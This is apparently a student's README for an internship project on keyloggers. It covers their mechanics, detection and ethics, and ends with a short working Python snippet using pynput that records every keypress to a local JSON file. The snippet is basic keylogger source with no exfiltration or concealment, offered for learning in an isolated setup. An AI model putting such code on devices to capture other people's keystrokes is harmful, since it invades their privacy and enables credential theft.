# Ethical Hacking and Cyber Security Internship

This repository contains the code, documentation, and insights from my summer internship project focused on **Ethical Hacking and Cyber Security** with a specialization in keylogger development and detection.

## Project Overview

The project explored the development, functionality, and ethical implications of keyloggers—a tool that records keystrokes on a system. It aims to provide a comprehensive understanding of keylogging mechanisms, their applications in cybersecurity, and strategies to mitigate the risks they pose.

### Key Objectives

1. Develop a Python-based keylogger capable of recording keystrokes and saving them in various formats.
2. Understand the working of hardware and software keyloggers.
3. Explore methods for detecting and preventing keylogger infections.
4. Discuss the ethical implications of keylogger usage.

---

## Features

- **Keylogger Development**:
  - Implements keystroke logging using Python's `pynput` library.
  - Saves logs in both JSON and plain text formats for analysis.
- **Controlled Environment Testing**:
  - Safe execution in an isolated setup to ensure ethical compliance.
- **Detection and Prevention**:
  - Discusses common detection techniques like signature analysis and behavior monitoring.
  - Suggests prevention measures, including endpoint security protocols.

---

## Coding Snippet

The keylogger implementation uses Python's `pynput` library. Below is a snippet showcasing the main functionality:

```python
from pynput import keyboard
import json

keys_used = []

def on_press(key):
    keys_used.append({'Pressed': f'{key}'})
    with open('key_log.json', 'w') as key_log:
        json.dump(keys_used, key_log)

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

start_keylogger()
